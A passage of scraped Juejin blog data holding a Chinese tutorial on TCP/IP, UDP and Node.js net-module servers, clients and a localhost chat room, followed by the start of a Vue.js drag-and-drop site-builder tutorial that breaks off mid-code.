href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxitu%2Fgold-miner\" rel=\"nofollow noopener noreferrer\">掘金翻译计划</a>、<a target=\"_blank\" href=\"https://link.juejin.im?target=http%3A%2F%2Fweibo.com%2Fjuejinfanyi\" rel=\"nofollow noopener noreferrer\">官方微博</a>、<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fjuejinfanyi\" rel=\"nofollow noopener noreferrer\">知乎专栏</a>。</p>\n</blockquote>\n</div>"},{"title":"理解TCP/IP、UDP - 通过nodejs的net模块","avatar":"https://gold-cdn.xitu.io/v3/static/img/default-avatar.e30559a.svg","author":"happyGloria","create_time":"2018 年 01 月 31 日","tags":["Node.js"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h2 class=\"heading\" data-id=\"heading-0\">1. 引子</h2>\n<p>最近在学习node.js的net模块，涉及到了tcp/ip,arp,rcmp,http等协议,在这之前本人仅对http协议进行过深入的研究，至于其它协议仅仅只是知道有这些协议存在而已，未深入研究过。说实在的，网络协议概念很简单，但是也很抽象，网上查了很多资料，都是一些晦涩难懂的语言，所以个人觉得，明白协议的作用、怎么用、以何种形式用，再去看协议的具体工作过程更会让人印象深刻，下面就简明扼要的阐述TCP、IP、UDP。</p>\n<blockquote>\n<p>TCP/IP协议，是传输控制协议/因特网互联协议，又名网络通讯协议，是Internet最基本的协议、Internet国际互联网络的基础，由网络层的IP协议和传输层的TCP协议组成。TCP/IP 定义了电子设备如何连入因特网，以及数据如何在它们之间传输的标准。协议采用了4层的层级结构，每一层都呼叫它的下一层所提供的协议来完成自己的需求。通俗而言：TCP负责发现传输的问题，一有问题就发出信号，要求重新传输，直到所有数据安全正确地传输到目的地。而IP是给因特网的每一台联网设备规定一个地址。-- 百度百科</p>\n</blockquote>\n<blockquote>\n<p>不同的计算机系统，就好像语言不同的两个人互相见了面，完全不能交流信息。因而他们需要定义一些共通的东西来进行交流，TCP/IP就是为此而生。</p>\n</blockquote>\n<p>封面图中，展示了OSI七层及TCP/IP五层协议的对应关系；</p>\n<ul>\n<li>网络由下往上分为物理层、数据链路层、网络层、传输层、应用层。</li>\n<li>IP协议对应于网络层，TCP协议对应于传输层，而HTTP协议对应于应用层，三者从本质上来说没有可比性，socket则是对TCP/IP协议的封装和应用（程序员层面上）。</li>\n<li>也可以说，TPC/IP协议是传输层协议，主要解决<strong>数据如何在网络中传输</strong>，而HTTP是应用层协议，主要解决 <strong>如何包装数据</strong>。</li>\n</ul>\n<h2 class=\"heading\" data-id=\"heading-1\">2. 一张图让你了解TCP/IP到底是啥？</h2>\n<p></p><figure><img alt=\"image\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/31/1614a5740c71feca?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1048\" data-height=\"591\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1048&quot; height=&quot;591&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>IP能锁定一台物理机器，对应着一张网卡，外界发来的数据包网卡都会接收。如果所有程序都需要监听网卡接发数据，每个包都被发到了所有应用程序，那应用程序符合不了，最后会垮掉，所以就诞生了端口这个标识，从数据安全层面考虑，一个标识号只能被一个应用程序监听。其实网卡都是被系统层封装了，<strong>端口和进程之间的关系也是系统封装好的</strong>。我们只需要用socket就行，给定一个端口号就行了。其它的事都交给操作系统去做。\n<strong>TCP读取端口号，这个端口号就是创建socket时注册的，socket创建成功应该有一个process ID，这应该是操作系统来完成的，TCP于是就把[ 端口号  Process ID] 联系了起来，于是就和这个Process ID进程交换，完成数据的发送和接收。</strong>  <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.zhihu.com%2Fquestion%2F22577025%2Fanswer%2F125711899\" rel=\"nofollow noopener noreferrer\">点击查看参考链接</a></p>\n<p>通过这篇文章，我才知道IP和TCP到底做了些啥玩意....... 就是寻址和保证数据传递正确；</p>\n<h2 class=\"heading\" data-id=\"heading-2\">3. TCP</h2>\n<h3 class=\"heading\" data-id=\"heading-3\">TCP三次握手四次断开</h3>\n<p></p><figure><img alt=\"image\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/31/1614a574105411f9?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"546\" data-height=\"768\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;546&quot; height=&quot;768&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<h3 class=\"heading\" data-id=\"heading-4\">1. 三次握手</h3>\n<ol>\n<li>第一次握手<code>主机A</code>通过一个标识为SYN标识位的数据段发送给主机B<code>请求连接</code>，通过该数据段告诉主机B希望建立连接，需要B应答，并告诉主机B传输的起始序列号;</li>\n<li>第二次握手是<code>主机B</code>用一个<code>确认应答</code>ACK和同步序列号SYNC标志位的数据段来响应主机A，一是发送ACK告诉主机A收到了数据段，二是通知主机A从哪个序列号做标记;</li>\n<li>第三次握手是<code>主机A确认收到</code>了主机B的数据段并可以开始传输实际数据。</li>\n</ol>\n<h3 class=\"heading\" data-id=\"heading-5\">2. 四次断开</h3>\n<ol>\n<li><code>主机A</code>发送FIN控制位发出<code>断开连接的请求</code>;</li>\n<li><code>主机B</code>进行响应，<code>确认收到断开连接请求</code>;</li>\n<li><code>主机B</code>提出反方向的<code>关闭要求</code>;</li>\n<li><code>主机A确认</code>收到的主机B的<code>关闭连接请求</code>;</li>\n</ol>\n<p>问题：为什么断开要四次，而不是三次？因为主机B在响应收到断开链接请求的同时，还存在未发送完的数据；</p>\n<h2 class=\"heading\" data-id=\"heading-6\">4. UDP</h2>\n<p>UDP协议并不提供超时重传，出错重传等功能，所以说其是不可靠的协议。</p>\n<h2 class=\"heading\" data-id=\"heading-7\">5. TCP与UDP的区别</h2>\n<p>TCP(Transimision Control Protocal)  ==&gt; http ftp smtp   ==&gt; 电话</p>\n<ul>\n<li>传输控制协议</li>\n<li>可靠的、面向连接的协议</li>\n<li>传输效率低</li>\n</ul>\n<p>UDP(User Datagram Protocal)   ==&gt; qq, 微信 ==&gt; 广播</p>\n<ul>\n<li>用户数据报协议</li>\n<li>不可靠的、无连接的服务</li>\n<li>传输效率高</li>\n</ul>\n<ol>\n<li>TCP是面向链接的，虽然说网络的不安全不稳定特性决定了多少次握手都不能保证连接的可靠性，但TCP的三次握手在最低限度上（实际上也很大程度上保证了）保证了连接的可靠性；而UDP不是面向连接的，UDP传送数据前并不与对方建立连接，对接收到的数据也不发送确认信号，发送端不知道数据是否会正确接收，当然也不用重发，所以说UDP是无连接的、不可靠的一种数据传输协议。\n2。也正由于1所说的特点，使得UDP的开销更小数据传输速率更高，因为不必进行收发数据的确认，所以UDP的实时性更好。</li>\n</ol>\n<p>知道了TCP和UDP的区别，就不难理解为何采用TCP传输协议的MSN比采用UDP的QQ传输文件慢了，但并不能说QQ的通信是不安全的，因为程序员可以手动对UDP的数据收发进行验证，比如发送方对每个数据包进行编号然后由接收方进行验证啊什么的，即使是这样，UDP因为在底层协议的封装上没有采用类似TCP的“三次握手”而实现了TCP所无法达到的传输效率。</p>\n<h2 class=\"heading\" data-id=\"heading-8\">6. node.js net模块</h2>\n<ul>\n<li>net模块也是node的核心模块,用于底层的网络通信；</li>\n<li>http.Server继承了net.Server；</li>\n<li>http客户端与http服务端的通信均依赖于socket（net.Socket）；</li>\n</ul>\n<h3 class=\"heading\" data-id=\"heading-9\">6.1 net模块组成</h3>\n<p>主要包含两个部分：</p>\n<ol>\n<li>\n<p><strong>net.Server</strong>\ntcp/server, 服务端TCP监听来自客户端的请求，并使用TCP连接(socket)向客户端发送数据；\n内部通过socket来实现与客户端的通信；</p>\n</li>\n<li>\n<p><strong>net.Socket</strong>\ntcp/本地，客户端TCP连接到服务器，并与服务器交换数据；\nsocket的node实现，实现了全双工的stream的接口；</p>\n</li>\n</ol>\n<h3 class=\"heading\" data-id=\"heading-10\">6.2 服务端net.Server</h3>\n<pre><code class=\"hljs bash\" lang=\"bash\"><span class=\"hljs-built_in\">let</span> net = require(<span class=\"hljs-string\">'net'</span>)\n<span class=\"hljs-built_in\">let</span> PORT = 8081\n<span class=\"hljs-built_in\">let</span> HOST = <span class=\"hljs-string\">'localhost'</span>\n/**\n * 1. 创建一个TCP服务器实例，调用listen函数开始监听指定端口；\n * 2. 传入net.createServer()的回调函数，作为connection事件的处理函数；\n * 3. 在每个connection事件中，该回调函数接收到的socket对象是唯一的；\n * 4. 该连接自动关联一个socket对象\n * */\n<span class=\"hljs-built_in\">let</span> server = net.createServer((socket) =&gt; {\n\tconsole.log(<span class=\"hljs-string\">'connection:'</span> + socket.remoteAddress, socket.remotePort)\n\t// 为这个socket实例添加一个“data”事件处理函数\n\tsocket.on(<span class=\"hljs-string\">'data'</span>, (data) =&gt; {\n\t\tconsole.log(<span class=\"hljs-string\">'DATA'</span> + socket.remoteAddress + <span class=\"hljs-string\">\":\"</span> + data);\n\t\tsocket.write(<span class=\"hljs-string\">'You said \"'</span>+ data +<span class=\"hljs-string\">'\"\\r\\n'</span>) // 向客户端回发该数据\n\t})\n\t\n\tsocket.on(<span class=\"hljs-string\">'end'</span>, () =&gt; {\n\t\tconsole.log(<span class=\"hljs-string\">'客户端关闭'</span>)\n\t\t/**\n\t\t * 服务端收到客户端发出的关闭连接请求时，会触发end事件\n\t\t * 这个时候客户端没有真正的关闭，只是开始关闭；\n\t\t * 当真正的关闭的时候，会触发close事件；\n\t\t * */\n\t\tserver.unref();\n\t\t//调用了该方法，则所有的客户端关闭跟本服务器的连接后，将关闭服务器\n\t})\n\t\n\t// 客户端关闭事件\n\tsocket.on(<span class=\"hljs-string\">'close'</span>, () =&gt; {\n\t\tconsole.log(<span class=\"hljs-string\">'CLOSED: '</span> + socket.remoteAddress + <span class=\"hljs-string\">' '</span> + socket.remotePort);\n\t})\n\t\n\t/*socket.pause()\n\tsocket.setTimeout(3000) //设置客户端超时时间，如果客户端一直不输入，超过这个时间，就认为超时了\n\tsocket.on(<span class=\"hljs-string\">'timeout'</span>, () =&gt; {\n\t\tconsole.log(<span class=\"hljs-string\">'超时了'</span>)\n\t\tsocket.pipe(ws, {end: <span class=\"hljs-literal\">false</span>})\n\t\t// 默认情况下，当可读流读到末尾的时候会关闭可写流\n\t})*/\n})\n\nserver.listen(PORT, HOST, () =&gt; {\n\tconsole.log(<span class=\"hljs-string\">'服务端的地址是：'</span>, server.address())\n})\n\nserver.on(<span class=\"hljs-string\">'error'</span>, (err) =&gt; {\n\tconsole.log(err)\n})\n\n//服务端也可以通过显式处理<span class=\"hljs-string\">\"connection\"</span>事件来建立TCP连接，只是写法不同，二者没有区别即:\n/*\n<span class=\"hljs-built_in\">let</span> server = net.createServer()\nserver.listen(PORT,HOST)\nserver.on(<span class=\"hljs-string\">'connection'</span>, (socket) =&gt; {\n\tconsole.log(<span class=\"hljs-string\">'CONNECTED: '</span> + sock.remoteAddress +<span class=\"hljs-string\">':'</span>+ sock.remotePort);\n})*/\nserver.on(<span class=\"hljs-string\">'close'</span>, () =&gt; {\n\t//关闭服务器，停止接收新的客户端的请求\n\tconsole.log( <span class=\"hljs-string\">'close事件：服务端关闭'</span> );\n})\n\nserver.on(<span class=\"hljs-string\">'error'</span>, (error) =&gt; {\n\tconsole.log( <span class=\"hljs-string\">'error事件：服务端异常：'</span> + error.message );\n})\n</code></pre><h3 class=\"heading\" data-id=\"heading-11\">6.3 客户端net.Socket</h3>\n<pre><code class=\"hljs bash\" lang=\"bash\"><span class=\"hljs-built_in\">let</span> net = require(<span class=\"hljs-string\">'net'</span>)\n\n//创建一个TCP客户端连接到刚创建的服务器上，该客户端向服务器发送一串消息，并在得到服务器的反馈后关闭连接。\n\nvar client = new net.Socket()\n<span class=\"hljs-built_in\">let</span> PORT = 8081\n<span class=\"hljs-built_in\">let</span> HOST = <span class=\"hljs-string\">'localhost'</span>\n\nclient.connect(PORT, HOST, () =&gt; {\n\tconsole.log(<span class=\"hljs-string\">'connect to '</span> + HOST + <span class=\"hljs-string\">':'</span> + PORT)\n\tclient.write(<span class=\"hljs-string\">'I am happyGloria.'</span>) //建立连接后立即向服务器发送数据，服务器将收到这些数据\n})\n\nclient.on(<span class=\"hljs-string\">'data'</span>, (data) =&gt; {\n\tconsole.log(<span class=\"hljs-string\">'DATA: '</span> + data)\n\tclient.destroy() // 完全关闭连接\n})\n\nclient.on(<span class=\"hljs-string\">'close'</span>, <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n\tconsole.log(<span class=\"hljs-string\">'Connection closed'</span>)\n})\n</code></pre><h3 class=\"heading\" data-id=\"heading-12\">6.4 基于tcp的聊天室</h3>\n<pre><code class=\"hljs bash\" lang=\"bash\"><span class=\"hljs-built_in\">let</span> net = require(<span class=\"hljs-string\">'net'</span>)\n<span class=\"hljs-built_in\">let</span> util = require(<span class=\"hljs-string\">'util'</span>)\n<span class=\"hljs-built_in\">let</span> HOST = <span class=\"hljs-string\">'localhost'</span>\n<span class=\"hljs-built_in\">let</span> PORT = 8082\n<span class=\"hljs-built_in\">let</span> clients = {}\n\n<span class=\"hljs-keyword\">function</span> broadcast (username, msg) {\n\t<span class=\"hljs-keyword\">for</span> (<span class=\"hljs-built_in\">let</span> name <span class=\"hljs-keyword\">in</span> clients) {\n\t\t<span class=\"hljs-keyword\">if</span> (name != username) {\n\t\t\tclients[name].write(msg + <span class=\"hljs-string\">'\\r\\n'</span>)\n\t\t}\n\t}\n}\n\n<span class=\"hljs-built_in\">let</span> server = net.createServer((socket) =&gt; {\n\tsocket.setEncoding(<span class=\"hljs-string\">'utf8'</span>)\n\tserver.getConnections((err, count) =&gt; {\n\t\tsocket.write(<span class=\"hljs-string\">'在线人数是'</span> + count + <span class=\"hljs-string\">'位，请输入你的昵称:\\r\\n'</span>)\n\t})\n\t\n\t<span class=\"hljs-built_in\">let</span> username\n\tsocket.on(<span class=\"hljs-string\">'data'</span>, (data) =&gt; {\n\t\tdata = data.replace(/\\r\\n/, <span class=\"hljs-string\">''</span>)\n\t\t<span class=\"hljs-keyword\">if</span> (username) {\n\t\t\tbroadcast(username, `<span class=\"hljs-variable\">${username}</span> 说: <span class=\"hljs-variable\">${data}</span>`)\n\t\t} <span class=\"hljs-keyword\">else</span> {\n\t\t\t<span class=\"hljs-keyword\">if</span> (clients[data]) {\n\t\t\t\tsocket.write(<span class=\"hljs-string\">'您的昵称'</span> + data + <span class=\"hljs-string\">'被占用了，请您更换新的昵称\\r\\n'</span>)\n\t\t\t} <span class=\"hljs-keyword\">else</span> {\n\t\t\t\tusername = data\n\t\t\t\tclients[username] = socket\n\t\t\t\tbroadcast(username, `欢迎<span class=\"hljs-variable\">${username}</span>加入`)\n\t\t\t}\n\t\t}\n\t})\n\t\n\tsocket.on(<span class=\"hljs-string\">'end'</span>, () =&gt; {\n\t\tbroadcast(username, `<span class=\"hljs-variable\">${username}</span>离开聊天室`)\n\t\tclients[username] &amp;&amp; clients[username].destroy()\n\t\tdelete clients[username]\n\t})\n})\n\n\nserver.listen(PORT, HOST, () =&gt; {\n\tconsole.log(`tcp聊天室已启动，地址是<span class=\"hljs-variable\">${util.inspect(server.address())}</span>`)\n})\n</code></pre><p>参考资料： https://www.zhihu.com/question/51074319</p>\n</div>"},{"title":"使用vue构建一个自动建站项目","avatar":"https://user-gold-cdn.xitu.io/2017/11/16/c2e25d0f5fe4eb7295f4449b1a78402b?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"深谷逸风","create_time":"2018 年 01 月 31 日","tags":["Vue.js","前端","jQuery","JavaScript"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h2 class=\"heading\" data-id=\"heading-0\">写在前面</h2>\n<p>之前一直用Jquery+Jquery-ui来做这个项目，那个时候没有设计稿，没有项目需求，就因为BOSS一句话，要做这样的东西，当时就...好吧！我承认，其实已经习惯了，无所谓了(也是无奈，哎)!!! <br>\n在之后的一段时间里，做了一个demo出来，BOSS很满意了，所以自己接下来就慢慢做吧，差不多两三个月吧，就闷头做这个，后来项目上线了，当然因为产品的不完善，还是有点问题了！<br>\n不过基本能满足公司的需求了，能编辑的都可以编辑，组件的background(包括背景图片) color border box-shadow margin padding width height 对齐方式(字体和组件内部元素) border-radius font(font-size/font-family)等等这些基础的都可以随心变更，当然考虑到可能满足不了公司的使用，就加了一个自定义样式的功能，而这个只有懂前端的人才能使用了，没办法，需求永远赶不上变化，这样保险一点。因为大家都知道，需求的满足和变更永远跑在现成需求的前面 <br>\n除了这些基础的可更改，各个组件的特有可变更的功能也基本齐全的，比如轮播图图片变更，轮播方式，控制是否轮播等等这些功能，这里就不一一介绍了<br>\n包括后来，因为有组件内部个别元素不能修改，又增加了[绑定修改]功能，就是这个功能选中之后，在视图界面，选中需要修改的元素，便可以进行修改了，这个功能还是有点意思的<br>\n说了这么多，其实当时因为做的仓促，存储的时候存的是HTML,大家不要鄙视(要脸0.0),这个也是我心里一直的梗，最近加上BOSS重新提出了一些想法，有蛮多东西要加，思前想后,决定将项目重构一下<br>\n考虑到vue响应式与基本是纯数据操作，所以决定使用vue重新构建这个项目。</p>\n<h2 class=\"heading\" data-id=\"heading-1\">开发准备</h2>\n<p><strong>1、</strong>使用vue-cli，下载下来配置好的东西<br>\n<strong>2、</strong>因为中间牵涉了拖拽生成组件的操作，所以使用了vuedraggable和sortablejs。<br></p>\n<p><strong>安装vuedraggable sortablejs</strong></p>\n<pre><code class=\"hljs js\" lang=\"js\">    npm install vuedraggable\n    npm install sortablejs\n</code></pre><p>项目中我们只需要引入vuedraggable就可以了，牵涉了sortablejs东西的时候，vuedraggable会去自己加载调用sortablejs里面的方法的，这个就不是我们需要关注的(你如果想了解，可以自己去看看)；<br>\n<strong>3、</strong>安装vuex，因为里面牵涉到了大量的数据交互，很多组件都需要一些公用的数据，不使用vuex去管理，将会为开发带来更多不必要的麻烦;<br></p>\n<p><strong>安装vuex</strong></p>\n<pre><code class=\"hljs bash\" lang=\"bash\">    npm install --save vuex\n</code></pre><p><strong>4、</strong>因为没有设计稿的缘故，所以大胆使用了第三方UI库 element-ui;<br>\n<a target=\"_blank\" href=\"https://link.juejin.im?target=http%3A%2F%2Felement-cn.eleme.io%2F%23%2Fzh-CN%2Fcomponent%2Finstallation\" rel=\"nofollow noopener noreferrer\">element-ui官网地址</a><br></p>\n<p><strong>安装elememt</strong></p>\n<pre><code class=\"hljs bash\" lang=\"bash\"> npm install element-ui\n //为什么是element-ui而不是element?因为当时npm上已经有了element包了(我当时还觉得挺有意思的，0.0 好冷啊！！！)\n</code></pre><p><strong>5、</strong>axios安装,后面与后台数据交互会用到<br></p>\n<p><strong>安装axios</strong></p>\n<pre><code class=\"hljs bash\" lang=\"bash\">npm install --save axios\n</code></pre><p>差不多准备工作就这些了，接下来我们看项目实施；</p>\n<h2 class=\"heading\" data-id=\"heading-2\">项目开始</h2>\n<h3 class=\"heading\" data-id=\"heading-3\">1、各种文件的配置</h3>\n<h4 class=\"heading\" data-id=\"heading-4\">-&gt; main.js中文件的配置</h4>\n<p></p><figure><img alt=\"main.js配置\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/31/1614a96406ca720d?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"603\" data-height=\"313\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;603&quot; height=&quot;313&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure>\n图片中都有解释，应该可以看的懂的；<p></p>\n<h4 class=\"heading\" data-id=\"heading-5\">-&gt; 侧边栏拖拽组件数据的配置</h4>\n<p></p><figure><img alt=\"dragApi\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/31/1614a9ccbea95359?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"597\" data-height=\"507\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;597&quot; height=&quot;507&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure>\n因为文件太长，所以删掉了一些，这里就是一个简单的格式，仅供参考，不作为标准；<p></p>\n<p>在组件当中，存在一个布局的问题，所以要有布局组件，让组件可以放到布局组建中，这样才更加的灵活</p>\n<h4 class=\"heading\" data-id=\"heading-6\">-&gt; vuexjs 状态管理中的js配置</h4>\n<p></p><figure><img alt=\"storejs配置\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/31/1614aa42fdce66b1?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"603\" data-height=\"536\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;603&quot; height=&quot;536&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p><strong>说明：</strong><br>\n1、因为用户在拖拽之后要实时保存到sessionStorage中， 所以再初始的时候要到sessionStroage中去取数据，防止突然刷新页面，还没有保存到数据库中，用户刚刚编辑的数据全部丢失的情况;<br>\n2、这里说明一下，可能考虑到用于已经提交了数据，所以用户关闭窗口之后，再次进来的时候，要结合后台给出的用户之前的数据，一起存储到sessionStorage中去，相信这一点大家肯定想的到的，这里善意提醒一下 0.0；<br>\n3、我这这里暂时放了四个参数，图中都有说明，我主要是将基本编辑做成了一个组件，会根据用户点击时哪个组件，而重新渲染数据给到编辑组件，从而可以实时对应到点击的组件去编辑；<br>\n4、editShow的作用就是控制编辑组件显示与否的，主要删除组件的时候，让编辑组件隐藏一下；点击其他组件的显示一下；</p>\n<blockquote>\n<p><strong>基本的配置就这些了，接下来就是真正的开发了;</strong></p>\n</blockquote>\n<hr>\n<h3 class=\"heading\" data-id=\"heading-7\">2、项目开发开始</h3>\n<h4 class=\"heading\" data-id=\"heading-8\">-&gt; app.vue文件中该怎么写？</h4>\n<pre><code class=\"hljs html\" lang=\"html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">template</span>&gt;</span>\n    <span class=\"hljs-comment\">&lt;!--用的element-ui--&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">el-container</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">el-aside</span>&gt;</span>\n            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">Draggable</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"app-aside-drag\"</span> <span class=\"hljs-attr\">:options</span>=<span class=\"hljs-string\">\"dragOption\"</span>&gt;</span>\n                <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"app-aside-list\"</span> \n                    <span class=\"hljs-attr\">v-for</span>=<span class=\"hljs-string\">\"(dragList,index) in dragData\"</span> \n                    <span class=\"hljs-attr\">:type</span>=<span class=\"hljs-string\">\"dragList.type\"</span> \n                    <span class=\"hljs-attr\">:key</span>=<span class=\"hljs-string\">\"dragList.type\"</span>&gt;</span>\n                    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"aside-item-body\"</span>&gt;</span>\n                        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">i</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"aside-item-ele\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">i</span>&gt;</span>\n                        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"aside-item-ele\"</span>&gt;</span>{{ list.title }}<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span>\n                    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n                <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n            <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">Draggable</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">el-aside</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">el-main</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"app-main\"</span>&gt;</span>\n            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">section</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"app-phone\"</span>&gt;</span>\n                <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"app-phone-header\"</span>&gt;</span>\n                    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"phone-camera\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span>\n                    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"phone-ls\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span>\n                <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n                <span class=\"hljs-comment\">&lt;!--页面view区 --&gt;</span>\n                <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">Sort</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"app-phone-body\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">Sort</span>&gt;</span>\n                <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"app-phone-footer\"</span>&gt;</span>\n                    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"app-phone-menu\"</span>&gt;</span>RS<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span>\n                <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n            <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">section</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">el-main</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">el-aside</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"app-right\"</span>&gt;</span>\n            <span class=\"hljs-comment\">&lt;!--组件编辑区域--&gt;</span>\n            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">BaseEdit</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">BaseEdit</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">el-aside</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">el-container</span>&gt;</span>    \n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">template</span>&gt;</span>\n\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\">\n<span class=\"hljs-keyword\">import</span> DragApi <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">\"@/dragapi/dragapi.js\"</span>;\n<span class=\"hljs-keyword\">import</span> Draggable <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">\"vuedraggable\"</span>;\n<span class=\"hljs-keyword\">import</span> Sort <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">\"@/view/Sort\"</span>;\n<span class=\"hljs-keyword\">import</span> BaseEdit <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">\"@/view/BaseEdit\"</span>;\n\n<span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span> {\n\t<span class=\"hljs-attr\">name</span>: <span class=\"hljs-string\">'app'</span>,\n\tdata(){\n\t    <span class=\"hljs-keyword\">return</span>{\n\t        <span class=\"hljs-attr\">dragData</span>: {},\n\t        <span class=\"hljs-attr\">dragOption</span>: {\n\t            <span class=\"hljs-attr\">group</span>: {\n\t                <span class=\"hljs-attr\">name</span>: <span class=\"hljs-string\">'components'</span>, <span class=\"hljs-comment\">//这个很重要，其他的与之能产生关联的拖拽框就靠这name 一定要一致</span>\n\t                pull: <span class=\"hljs-string\">'clone'</span>,  \n\t                <span class=\"hljs-attr\">put</span>: <span class=\"hljs-literal\">false</span>\n\t            },\n\t            <span class=\"hljs-attr\">sort</span>: <span class=\"hljs-literal\">false</span> <span class=\"hljs-comment\">//默然为true。这里我们只需要他拖拽，无需能拖动排序</span>\n\t        }\n\t    }\n\t},\n\t<span class=\"hljs-attr\">components</span>: {\n\t    Draggable,\n\t    Sort,\n\t    BaseEdit\n\t},\n\tcreated(){\n\t    <span class=\"hljs-comment\">//侧边栏拖拽列表数据</span>\n\t    <span 